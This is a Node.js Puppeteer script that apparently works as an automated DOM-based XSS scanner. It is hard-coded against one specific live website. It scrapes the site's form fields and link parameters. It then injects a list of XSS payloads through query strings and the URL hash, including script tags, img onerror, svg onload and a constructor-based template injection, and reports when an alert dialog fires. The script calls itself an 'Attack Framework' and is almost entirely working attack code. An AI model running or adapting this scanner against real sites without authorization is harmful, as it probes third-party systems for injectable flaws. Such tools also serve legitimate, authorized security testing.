const puppeteer = require('puppeteer-core');

// Comprehensive payloads targeting different execution vectors
const payloads = [
    'javascript:alert(1)',
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"`><script>alert(1)</script>',
    '${alert(1)}',
    '{{constructor.constructor(\'alert(1)\')()}}'
];

const baseUrl = 'https://1w.run'; 

async function scanForDOMXSS() {
    console.log(`[+] Initializing Chromium Browser via Puppeteer...`);
    const browser = await puppeteer.launch({ 
        executablePath: '/usr/bin/chromium-browser',
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });

    const page = await browser.newPage();
    const discoveredParams = new Set(['search', 'q']); // Default fallbacks

    // === PHASE 1: AUTOMATIC PARAMETER DISCOVERY ===
    console.log(`\n[🔍 Phase 1]: Discovering input parameters on ${baseUrl}...`);
    try {
        await page.goto(baseUrl, { waitUntil: 'networkidle2', timeout: 15000 });
        
        // Extract input fields, form actions, and hyperlink query structures dynamically
        const extractedParams = await page.evaluate(() => {
            const keys = [];
            
            // 1. Scrape all input elements with name/id attributes
            document.querySelectorAll('input, textarea, select').forEach(el => {
                if (el.name) keys.push(el.name);
                else if (el.id) keys.push(el.id);
            });
            
            // 2. Scrape internal anchor link query strings
            document.querySelectorAll('a').forEach(el => {
                const href = el.getAttribute('href');
                if (href && href.includes('?')) {
                    const urlParams = new URLSearchParams(href.split('?')[1]);
                    for (const key of urlParams.keys()) {
                        keys.push(key);
                    }
                }
            });
            
            return keys;
        });

        extractedParams.forEach(param => discoveredParams.add(param));
        console.log(`[+] Discovery complete. Active targets: [ ${Array.from(discoveredParams).join(', ')} ]`);

    } catch (err) {
        console.log(`[-] Discovery step timed out or encountered an error. Using fallbacks.`);
    } finally {
        await page.close();
    }

    // === PHASE 2: TARGETED FUZZING CAMPAIGN ===
    console.log(`\n[🚀 Phase 2]: Starting Attack Framework Execution...`);

    for (let payload of payloads) {
        // Build an array of specific URLs to test for this individual payload
        const testUrls = [];

        // Add automated query paths based on discovered parameters
        discoveredParams.forEach(param => {
            testUrls.push({
                url: `${baseUrl}?${param}=${encodeURIComponent(payload)}`,
                type: `QUERY (${param})`
            });
        });

        // Add URL Hash vector
        testUrls.push({
            url: `${baseUrl}#${encodeURIComponent(payload)}`,
            type: 'HASH (#)'
        });

        for (let target of testUrls) {
            const attackPage = await browser.newPage();
            let xssDetected = false;

            // Triggered if alert() fires
            attackPage.on('dialog', async dialog => {
                if (dialog.message() || dialog.type() === 'alert') {
                    console.log(`\n[🚨 XSS DETECTED!]`);
                    console.log(`[🎯 Vector Type]      : ${target.type}`);
                    console.log(`[🎯 Triggering URL]   : ${target.url}`);
                    console.log(`[💬 Dialog Message]   : "${dialog.message()}"\n`);
                    xssDetected = true;
                    await dialog.dismiss();
                }
            });

            // Catch script-blocking events
            attackPage.on('console', msg => {
                if (msg.type() === 'error' && msg.text().toLowerCase().includes('alert')) {
                    console.log(`[⚠️ Console Warning]: Execution context caught/blocked: ${msg.text()}`);
                }
            });

            // Catch syntax breakages or execution exceptions
            attackPage.on('pageerror', error => {
                if (error.message.includes('alert') || error.message.includes('Unexpected token')) {
                    console.log(`[💥 JS Exception Found]: Code broke near context -> ${error.message}`);
                }
            });

            try {
                console.log(`[*] Testing target vector [${target.type}]: ${target.url}`);
                await attackPage.goto(target.url, { waitUntil: 'networkidle2', timeout: 10000 });
                await new Promise(resolve => setTimeout(resolve, 1500));

                // Reflection Analyzer: Verify if the input lands unencoded in the DOM structure
                const pageContent = await attackPage.content();
                if (!xssDetected && pageContent.includes(payload)) {
                    console.log(`   └─ [🔍 Passive Reflection]: Input mirrored inside page text. Potential clean sink.`);
                }

            } catch (error) {
                console.log(`[-] Connection timeout on payload iteration.`);
            } finally {
                await attackPage.close();
            }
        }
    }

    console.log(`\n[+] Dynamic Crawl & Scan Campaign Finished.`);
    await browser.close();
}

scanForDOMXSS();
